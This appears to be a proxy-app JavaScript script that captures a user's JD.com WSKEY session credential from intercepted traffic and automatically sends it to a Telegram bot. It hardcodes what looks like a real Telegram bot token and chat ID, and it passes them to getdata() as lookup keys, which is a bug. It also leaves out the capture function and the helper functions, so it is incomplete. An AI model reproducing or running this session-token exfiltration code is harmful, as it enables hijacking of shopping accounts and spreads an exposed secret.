const $ = new Env('京东 WSKEY');
$.jd_tempKey = 'jd_temp', $.wskeyKey = 'wskeyList';  // 缓存键名
$.is_debug = $.getdata('is_debug') || 'false';  // 调试模式
$.chat_id = $.getdata('5175107046') || '';  // TG CHAT ID
$.bot_token = $.getdata('6773619813:AAFDlzyt3lA-K4hwEv_atXylKpe_lttJeDc') || '';  // TG Robot Token
$.autoSubmit = $.getdata('WSKEY_AUTO_UPLOAD') || 'true';  // 是否自动提交
$.Messages = [], $.cookie = '';  // 初始化数据

// 脚本执行入口
!(async () => {
  if (typeof $request !== `undefined`) {
    await GetCookie();
    if ($.cookie && $.autoSubmit != 'false') {
      await SubmitCK();
    } else if ($.cookie) {
      $.Messages.push(`🎉 WSKEY 获取成功\n${$.cookie}`);
      $.setjson($.wskeyList, $.wskeyKey);  // 写入数据持久化
    }
  }
})()
  .catch((e) => $.Messages.push(e.message || e) && $.logErr(e))
  .finally(async () => {
    await sendMsg($.Messages.join('\n').trimStart().trimEnd());  // 推送通知
    $.done();
  })

// 获取用户数据
async function GetCookie() {
  // 函数内容保持不变
}

// 提交 WSKEY
async function SubmitCK() {
  let msg = `🎉 WSKEY 获取成功。\n${$.cookie}`;
  // 检查是否配置了Telegram机器人Token和聊天ID
  if ($.bot_token && $.chat_id) {
    // 构造Telegram API的URL用于发送消息
    let tgUrl = `https://api.telegram.org/bot${$.bot_token}/sendMessage`;
    let options = {
      url: tgUrl,
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: $.chat_id,
        text: msg,
        disable_web_page_preview: true
      }),
      _method: 'POST', // 指定请求方法为POST
      _respType: 'json' // 指定响应类型为json
    };
    // 发起请求发送消息
    let result = await Request(options);
    if (result && result.ok) {
      $.log(`🎉 WSKEY 通过Telegram发送成功。\n${$.cookie}`);
    } else {
      $.log(`❌ WSKEY 通过Telegram发送失败。\n${$.cookie}`);
      if (result && result.description) {
        $.log(`错误详情: ${result.description}`);
      }
    }
  } else {
    $.log(`⚠️ Telegram bot token 或 chat_id 未配置。`);
  }
  $.Messages.push(msg), $.log(msg);
}

// 其他函数保持不变，包括：
// ObjectKeys2LowerCase, Request, sendMsg, debug, Env 类等

// 注意：此处省略了GetCookie函数和其他辅助函数的具体实现，
// 以及Env类的定义，这些部分与原始代码相同，没有变化。
